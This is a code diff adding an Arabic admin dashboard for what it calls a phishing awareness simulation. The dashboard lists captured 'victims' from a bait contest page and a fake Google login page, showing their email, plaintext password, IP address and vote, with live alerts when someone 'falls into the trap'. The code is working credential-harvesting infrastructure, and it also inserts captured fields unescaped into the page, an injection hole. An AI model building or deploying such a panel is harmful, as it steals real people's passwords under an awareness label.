@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>لوحة القيادة السيبرانية — مركز تحكم الأدمن</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <style>
+    :root {
+      --bg-dark: #070a13;
+      --panel-bg: rgba(15, 23, 42, 0.7);
+      --panel-border: rgba(255, 255, 255, 0.08);
+      --accent-blue: #3b82f6;
+      --accent-red: #ef4444;
+      --accent-green: #10b981;
+      --accent-amber: #f59e0b;
+    }
+
+    body {
+      background: var(--bg-dark);
+      color: #f8fafc;
+      font-family: 'Cairo', sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* شريط علوي أنيق */
+    .admin-navbar {
+      background: rgba(15, 23, 42, 0.85);
+      border-bottom: 1px solid var(--panel-border);
+      padding: 16px 28px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      backdrop-filter: blur(12px);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    .nav-brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 1.25rem;
+      font-weight: 900;
+    }
+    .brand-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #ef4444, #dc2626);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.3rem;
+      box-shadow: 0 0 20px rgba(239, 68, 68, 0.4);
+    }
+    .nav-actions {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    .live-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(16, 185, 129, 0.12);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      color: #34d399;
+      padding: 6px 14px;
+      border-radius: 50px;
+      font-size: 0.82rem;
+      font-weight: 700;
+    }
+    .pulsing-dot {
+      width: 8px;
+      height: 8px;
+      background: #10b981;
+      border-radius: 50%;
+      animation: pulseDot 1.5s infinite;
+    }
+    @keyframes pulseDot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(1.4); }
+    }
+
+    .audio-toggle-btn {
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid var(--panel-border);
+      color: #f1f5f9;
+      padding: 8px 14px;
+      border-radius: 8px;
+      font-family: inherit;
+      font-size: 0.85rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.2s;
+    }
+    .audio-toggle-btn.active {
+      background: rgba(59, 130, 246, 0.2);
+      border-color: #3b82f6;
+      color: #60a5fa;
+    }
+
+    /* الحاوية الرئيسية */
+    .admin-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 28px 20px 60px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    /* بطاقات المؤشرات الإحصائية */
+    .kpi-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 16px;
+      margin-bottom: 28px;
+    }
+    .kpi-card {
+      background: var(--panel-bg);
+      border: 1px solid var(--panel-border);
+      border-radius: 18px;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      backdrop-filter: blur(10px);
+      transition: transform 0.2s;
+    }
+    .kpi-card:hover {
+      transform: translateY(-2px);
+    }
+    .kpi-info {}
+    .kpi-title {
+      font-size: 0.85rem;
+      color: #94a3b8;
+      margin-bottom: 4px;
+      font-weight: 600;
+    }
+    .kpi-num {
+      font-size: 2rem;
+      font-weight: 900;
+      line-height: 1;
+    }
+    .kpi-icon-box {
+      width: 50px;
+      height: 50px;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+    }
+
+    /* شريط الأدوات الرئيسي */
+    .toolbar-box {
+      background: var(--panel-bg);
+      border: 1px solid var(--panel-border);
+      border-radius: 18px;
+      padding: 16px 20px;
+      margin-bottom: 28px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+    .toolbar-title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 800;
+      font-size: 1.1rem;
+    }
+    .toolbar-actions {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .btn-trigger-all {
+      background: linear-gradient(135deg, #ef4444, #dc2626);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      padding: 10px 22px;
+      font-size: 0.95rem;
+      font-weight: 800;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 0 20px rgba(239, 68, 68, 0.4);
+      transition: all 0.2s;
+    }
+    .btn-trigger-all:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 30px rgba(239, 68, 68, 0.6);
+    }
+    .btn-trigger-all:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    .btn-refresh {
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid var(--panel-border);
+      color: #f1f5f9;
+      border-radius: 10px;
+      padding: 10px 18px;
+      font-size: 0.9rem;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.2s;
+    }
+    .btn-refresh:hover {
+      background: rgba(255, 255, 255, 0.12);
+    }
+
+    .btn-clear-all {
+      background: rgba(239, 68, 68, 0.1);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      color: #fca5a5;
+      border-radius: 10px;
+      padding: 10px 16px;
+      font-size: 0.85rem;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-clear-all:hover {
+      background: rgba(239, 68, 68, 0.2);
+    }
+
+    /* جدول الضحايا والبطاقات */
+    .feed-container {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .victim-card {
+      background: var(--panel-bg);
+      border: 1px solid var(--panel-border);
+      border-radius: 18px;
+      padding: 20px 24px;
+      backdrop-filter: blur(10px);
+      display: grid;
+      grid-template-columns: auto 1fr auto auto;
+      align-items: center;
+      gap: 20px;
+      transition: all 0.2s;
+    }
+    .victim-card:hover {
+      border-color: rgba(255, 255, 255, 0.18);
+    }
+    .victim-card.waiting {
+      border-right: 5px solid var(--accent-amber);
+    }
+    .victim-card.triggered {
+      border-right: 5px solid var(--accent-red);
+      background: rgba(239, 68, 68, 0.04);
+    }
+    .victim-card.deleted {
+      border-right: 5px solid var(--accent-green);
+      opacity: 0.7;
+    }
+
+    .status-badge-lg {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 14px;
+      border-radius: 50px;
+      font-size: 0.8rem;
+      font-weight: 800;
+    }
+    .status-waiting {
+      background: rgba(245, 158, 11, 0.15);
+      border: 1px solid rgba(245, 158, 11, 0.4);
+      color: #fbbf24;
+      animation: pulseAmber 2s infinite;
+    }
+    @keyframes pulseAmber {
+      0%, 100% { box-shadow: 0 0 5px rgba(245, 158, 11, 0.2); }
+      50% { box-shadow: 0 0 15px rgba(245, 158, 11, 0.4); }
+    }
+    .status-triggered {
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      color: #f87171;
+    }
+    .status-deleted {
+      background: rgba(16, 185, 129, 0.15);
+      border: 1px solid rgba(16, 185, 129, 0.4);
+      color: #34d399;
+    }
+
+    .victim-details {}
+    .victim-email {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #60a5fa;
+      margin-bottom: 4px;
+      direction: ltr;
+      text-align: right;
+    }
+    .victim-meta {
+      font-size: 0.82rem;
+      color: #94a3b8;
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+    .meta-item {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    /* مربع كلمة المرور */
+    .pass-box {
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 8px;
+      padding: 6px 12px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.9rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      direction: ltr;
+    }
+    .pass-val {
+      color: #f87171;
+      font-weight: bold;
+    }
+    .btn-toggle-eye {
+      background: none;
+      border: none;
+      color: #94a3b8;
+      cursor: pointer;
+      font-size: 0.9rem;
+      padding: 0;
+    }
+
+    /* أزرار إجراء البطاقة */
+    .card-actions {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .btn-trigger-single {
+      background: linear-gradient(135deg, #ef4444, #b91c1c);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 18px;
+      font-size: 0.9rem;
+      font-weight: 800;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
+      transition: all 0.2s;
+      white-space: nowrap;
+    }
+    .btn-trigger-single:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(239, 68, 68, 0.5);
+    }
+
+    .btn-del-single {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid var(--panel-border);
+      color: #94a3b8;
+      border-radius: 8px;
+      padding: 9px 12px;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-del-single:hover {
+      color: #ef4444;
+      border-color: rgba(239, 68, 68, 0.3);
+      background: rgba(239, 68, 68, 0.1);
+    }
+
+    .empty-state {
+      background: var(--panel-bg);
+      border: 1px dashed var(--panel-border);
+      border-radius: 20px;
+      padding: 60px 20px;
+      text-align: center;
+      color: #64748b;
+    }
+    .empty-icon {
+      font-size: 3rem;
+      margin-bottom: 12px;
+    }
+
+    /* إشعار عائم Toast */
+    .toast-alert {
+      position: fixed;
+      bottom: 24px;
+      left: 24px;
+      background: #1e293b;
+      border: 2px solid #ef4444;
+      border-radius: 14px;
+      padding: 16px 20px;
+      color: white;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      display: none;
+      align-items: center;
+      gap: 14px;
+      z-index: 1000;
+      animation: slideInLeft 0.4s ease;
+    }
+    @keyframes slideInLeft {
+      0% { opacity: 0; transform: translateX(-30px); }
+      100% { opacity: 1; transform: translateX(0); }
+    }
+
+    /* روابط المعاينة السريعة */
+    .quick-links {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-top: 24px;
+      padding-top: 20px;
+      border-top: 1px solid var(--panel-border);
+    }
+    .quick-link-btn {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--panel-border);
+      color: #94a3b8;
+      text-decoration: none;
+      padding: 6px 14px;
+      border-radius: 6px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+    .quick-link-btn:hover {
+      color: #60a5fa;
+      border-color: rgba(96, 165, 250, 0.3);
+      background: rgba(96, 165, 250, 0.08);
+    }
+
+    @media (max-width: 850px) {
+      .victim-card {
+        grid-template-columns: 1fr;
+        gap: 14px;
+      }
+      .card-actions {
+        justify-content: flex-start;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- شريط الملاحة -->
+  <nav class="admin-navbar">
+    <div class="nav-brand">
+      <div class="brand-icon">🛡️</div>
+      <div>
+        <span>مركز القيادة والتحكم في التوعية</span>
+        <div style="font-size: 0.72rem; color: #94a3b8; font-weight: normal;">مشروع محاكاة التصيد التوعوي — التحكم المباشر</div>
+      </div>
+    </div>
+    <div class="nav-actions">
+      <div class="live-pill">
+        <span class="pulsing-dot"></span>
+        <span>بث حي متزامن</span>
+      </div>
+      <button class="audio-toggle-btn active" id="audioToggleBtn" onclick="toggleAudio()">
+        <span id="audioIcon">🔔</span>
+        <span>صوت التنبيه: <b id="audioStatusText">مفعّل</b></span>
+      </button>
+    </div>
+  </nav>
+
+  <div class="admin-container">
+
+    <!-- كروت المؤشرات KPI -->
+    <div class="kpi-grid">
+      <div class="kpi-card">
+        <div class="kpi-info">
+          <div class="kpi-title">إجمالي الحسابات الملتقطة</div>
+          <div class="kpi-num" id="totalCount" style="color: #60a5fa;">0</div>
+        </div>
+        <div class="kpi-icon-box" style="background: rgba(59, 130, 246, 0.12); color: #60a5fa;">👥</div>
+      </div>
+
+      <div class="kpi-card">
+        <div class="kpi-info">
+          <div class="kpi-title">في الانتظار (على صفحة الشكر)</div>
+          <div class="kpi-num" id="waitingCount" style="color: #fbbf24;">0</div>
+        </div>
+        <div class="kpi-icon-box" style="background: rgba(245, 158, 11, 0.12); color: #fbbf24;">⏳</div>
+      </div>
+
+      <div class="kpi-card">
+        <div class="kpi-info">
+          <div class="kpi-title">تم إطلاق شاشة التوعية لهم</div>
+          <div class="kpi-num" id="triggeredCount" style="color: #f87171;">0</div>
+        </div>
+        <div class="kpi-icon-box" style="background: rgba(239, 68, 68, 0.12); color: #f87171;">⚡</div>
+      </div>
+
+      <div class="kpi-card">
+        <div class="kpi-info">
+          <div class="kpi-title">تم حذف بياناتهم بنجاح</div>
+          <div class="kpi-num" id="deletedCount" style="color: #34d399;">0</div>
+        </div>
+        <div class="kpi-icon-box" style="background: rgba(16, 185, 129, 0.12); color: #34d399;">🗑️</div>
+      </div>
+    </div>
+
+    <!-- شريط الأدوات الرئيسي -->
+    <div class="toolbar-box">
+      <div class="toolbar-title">
+        <span>📡 قائمة الضحايا المسجلين في الوقت الفعلي</span>
+        <span style="font-size: 0.8rem; color: #64748b; font-weight: normal;">(يتم التحديث تلقائياً كل ثانيتين)</span>
+      </div>
+      <div class="toolbar-actions">
+        <button class="btn-trigger-all" id="btnTriggerAll" onclick="triggerAllWaiting()">
+          <span>⚡</span>
+          <span>إطلاق التوعية لجميع المنتظرين</span>
+        </button>
+        <button class="btn-refresh" onclick="fetchRecords(true)">
+          <span>🔄</span>
+          <span>تحديث فوري</span>
+        </button>
+        <button class="btn-clear-all" onclick="clearAllRecords()">
+          <span>🧹 مسح الكل</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- قائمة الضحايا -->
+    <div class="feed-container" id="victimsFeed">
+      <div class="empty-state">
+        <div class="empty-icon">⏳</div>
+        <h3>في انتظار تسجيل أي ضحية...</h3>
+        <p>قم بفتح صفحة المسابقة أو تسجيل الدخول في نافذة أخرى أو أرسل الرابط لزملائك لبدء التجربة التوعوية.</p>
+      </div>
+    </div>
+
+    <!-- روابط سريعة لاختبار المنظومة -->
+    <div class="quick-links">
+      <span style="color: #64748b; font-size: 0.8rem; display: flex; align-items: center;">روابط فحص المنظومة:</span>
+      <a href="index.html" target="_blank" class="quick-link-btn">🎯 صفحة المسابقة (الطُعم)</a>
+      <a href="login.html" target="_blank" class="quick-link-btn">🔑 صفحة تسجيل الدخول (Google)</a>
+      <a href="vote.html" target="_blank" class="quick-link-btn">🗳️ صفحة اختيار المرشح</a>
+      <a href="thankyou.html" target="_blank" class="quick-link-btn">✅ صفحة الشكر (شاشة الانتظار)</a>
+      <a href="reveal.html" target="_blank" class="quick-link-btn">💻 شاشة الهاكر وحذف البيانات</a>
+      <a href="awareness.html" target="_blank" class="quick-link-btn">🛡️ صفحة التوعية التعليمية</a>
+    </div>
+
+  </div>
+
+  <!-- إشعار Toast العائم -->
+  <div class="toast-alert" id="toastAlert">
+    <div style="font-size: 1.8rem;">🚨</div>
+    <div>
+      <div style="font-weight: 800; font-size: 0.95rem; margin-bottom: 2px;">ضحية جديدة دخلت في الفخ!</div>
+      <div style="font-size: 0.82rem; color: #cbd5e1;" id="toastMsg">تم التقاط بيانات الحساب</div>
+    </div>
+  </div>
+
+  <script>
+    let audioEnabled = true;
+    let knownRecordIds = new Set();
+    let isFirstLoad = true;
+
+    // تشغيل نغمة تنبيه احترافية بالـ Web Audio API
+    function playNewVictimChime() {
+      if (!audioEnabled) return;
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
+        // النوتة الأولى (High)
+        const osc1 = audioCtx.createOscillator();
+        const gain1 = audioCtx.createGain();
+        osc1.type = 'sine';
+        osc1.frequency.setValueAtTime(587.33, audioCtx.currentTime); // D5
+        gain1.gain.setValueAtTime(0.2, audioCtx.currentTime);
+        gain1.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+        osc1.connect(gain1);
+        gain1.connect(audioCtx.destination);
+        osc1.start();
+        osc1.stop(audioCtx.currentTime + 0.3);
+
+        // النوتة الثانية (Higher)
+        setTimeout(() => {
+          const osc2 = audioCtx.createOscillator();
+          const gain2 = audioCtx.createGain();
+          osc2.type = 'sine';
+          osc2.frequency.setValueAtTime(880, audioCtx.currentTime); // A5
+          gain2.gain.setValueAtTime(0.25, audioCtx.currentTime);
+          gain2.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
+          osc2.connect(gain2);
+          gain2.connect(audioCtx.destination);
+          osc2.start();
+          osc2.stop(audioCtx.currentTime + 0.4);
+        }, 120);
+
+      } catch (e) {
+        console.warn('Audio play failed:', e);
+      }
+    }
+
+    function toggleAudio() {
+      audioEnabled = !audioEnabled;
+      const btn = document.getElementById('audioToggleBtn');
+      const text = document.getElementById('audioStatusText');
+      const icon = document.getElementById('audioIcon');
+      if (audioEnabled) {
+        btn.classList.add('active');
+        text.textContent = 'مفعّل';
+        icon.textContent = '🔔';
+        playNewVictimChime();
+      } else {
+        btn.classList.remove('active');
+        text.textContent = 'صامت';
+        icon.textContent = '🔕';
+      }
+    }
+
+    function showToast(email, candidate) {
+      const toast = document.getElementById('toastAlert');
+      const msg = document.getElementById('toastMsg');
+      msg.textContent = `${email} — ${candidate || 'في مرحلة التصويت'}`;
+      toast.style.display = 'flex';
+      playNewVictimChime();
+      setTimeout(() => {
+        toast.style.display = 'none';
+      }, 5000);
+    }
+
+    // جلب السجلات من الخادم
+    async function fetchRecords(manual = false) {
+      try {
+        const res = await fetch('/api/admin/records');
+        const data = await res.json();
+
+        if (data.success) {
+          document.getElementById('totalCount').textContent = data.total;
+          document.getElementById('waitingCount').textContent = data.waitingCount;
+          document.getElementById('triggeredCount').textContent = data.triggeredCount;
+          document.getElementById('deletedCount').textContent = data.deletedCount;
+
+          document.getElementById('btnTriggerAll').disabled = data.waitingCount === 0;
+
+          // التحقق من وصول ضحايا جدد لإطلاق التنبيه
+          if (!isFirstLoad) {
+            data.records.forEach(r => {
+              if (!knownRecordIds.has(r.id)) {
+                showToast(r.email, r.candidate);
+              }
+            });
+          }
+
+          // تحديث السجلات المعروفة
+          knownRecordIds = new Set(data.records.map(r => r.id));
+          isFirstLoad = false;
+
+          renderFeed(data.records);
+        }
+      } catch (err) {
+        console.warn('Fetch records error:', err);
+      }
+    }
+
+    // بناء واجهة السجلات
+    function renderFeed(records) {
+      const feed = document.getElementById('victimsFeed');
+
+      if (!records || records.length === 0) {
+        feed.innerHTML = `
+          <div class="empty-state">
+            <div class="empty-icon">⏳</div>
+            <h3>في انتظار تسجيل أي ضحية...</h3>
+            <p>قم بفتح صفحة المسابقة أو تسجيل الدخول في نافذة أخرى لبدء التجربة التوعوية.</p>
+          </div>
+        `;
+        return;
+      }
+
+      feed.innerHTML = records.map(r => {
+        const statusClass = r.status || 'waiting';
+        let badgeHtml = '';
+        let actionBtnHtml = '';
+
+        if (r.status === 'waiting') {
+          badgeHtml = `<span class="status-badge-lg status-waiting">⏳ ينتظر على صفحة الشكر</span>`;
+          actionBtnHtml = `
+            <button class="btn-trigger-single" onclick="triggerSingle('${r.id}', '${r.email}')">
+              <span>⚡</span>
+              <span>إطلاق التوعية الآن</span>
+            </button>
+          `;
+        } else if (r.status === 'triggered') {
+          badgeHtml = `<span class="status-badge-lg status-triggered">🚨 يشاهد شاشة الهاكر الآن</span>`;
+          actionBtnHtml = `<span style="font-size:0.85rem; color:#f87171; font-weight:700;">تم إطلاق التوعية 👁️</span>`;
+        } else if (r.status === 'deleted') {
+          badgeHtml = `<span class="status-badge-lg status-deleted">✅ حذف بياناته بنجاح</span>`;
+          actionBtnHtml = `<span style="font-size:0.85rem; color:#34d399; font-weight:700;">تم الحذف بواسطة الضحية</span>`;
+        }
+
+        const dateStr = new Date(r.timestamp).toLocaleString('ar-SA');
+        const candidateStr = r.candidate ? `صوّت لصالح: <b>${r.candidate}</b>` : '<span style="color:#f59e0b;">لم يختر مرشحاً بعد</span>';
+
+        return `
+          <div class="victim-card ${statusClass}" id="card-${r.id}">
+            <div>
+              ${badgeHtml}
+            </div>
+
+            <div class="victim-details">
+              <div class="victim-email">${r.email}</div>
+              <div class="victim-meta">
+                <div class="meta-item">🗳️ ${candidateStr}</div>
+                <div class="meta-item">🌐 IP: <span style="font-family:monospace;">${r.ip}</span></div>
+                <div class="meta-item">⏰ ${dateStr}</div>
+              </div>
+            </div>
+
+            <div class="pass-box">
+              <span class="pass-val" id="pass-${r.id}">••••••••</span>
+              <button class="btn-toggle-eye" onclick="togglePass('${r.id}', '${escapeHtml(r.password)}')">👁️</button>
+            </div>
+
+            <div class="card-actions">
+              ${actionBtnHtml}
+              <button class="btn-del-single" onclick="deleteSingle('${r.id}')" title="حذف السجل">🗑️</button>
+            </div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    function togglePass(id, actualPass) {
+      const span = document.getElementById(`pass-${id}`);
+      if (span.textContent === '••••••••') {
+        span.textContent = actualPass;
+      } else {
+        span.textContent = '••••••••';
+      }
+    }
+
+    function escapeHtml(str) {
+      return (str || '').replace(/'/g, "\\'").replace(/"/g, '&quot;');
+    }
+
+    // إطلاق التوعية لضحية محددة
+    async function triggerSingle(id, email) {
+      try {
+        const res = await fetch(`/api/admin/trigger/${id}`, { method: 'POST' });
+        const data = await res.json();
+        if (data.success) {
+          fetchRecords();
+        }
+      } catch (err) {
+        alert('حدث خطأ في الاتصال بالخادم');
+      }
+    }
+
+    // إطلاق التوعية لجميع المنتظرين دفعة واحدة
+    async function triggerAllWaiting() {
+      if (!confirm('هل أنت متأكد من إطلاق شاشة التوعية لجميع الضحايا المنتظرين الآن؟')) return;
+
+      try {
+        const res = await fetch('/api/admin/trigger-all', { method: 'POST' });
+        const data = await res.json();
+        if (data.success) {
+          fetchRecords();
+        }
+      } catch (err) {
+        alert('حدث خطأ في الاتصال بالخادم');
+      }
+    }
+
+    // حذف سجل مفرد
+    async function deleteSingle(id) {
+      if (!confirm('هل تريد حذف هذا السجل نهائياً؟')) return;
+      try {
+        await fetch(`/api/admin/delete/${id}`, { method: 'DELETE' });
+        fetchRecords();
+      } catch (err) {}
+    }
+
+    // مسح جميع السجلات
+    async function clearAllRecords() {
+      if (!confirm('تحذير: سيتم حذف جميع السجلات من قاعدة البيانات! هل أنت متأكد؟')) return;
+      try {
+        await fetch('/api/admin/clear-all', { method: 'DELETE' });
+        fetchRecords();
+      } catch (err) {}
+    }
+
+    // بدء التحديث الدوري كل ثانيتين
+    fetchRecords();
+    setInterval(fetchRecords, 2000);
+  </script>
+</body>
+</html>
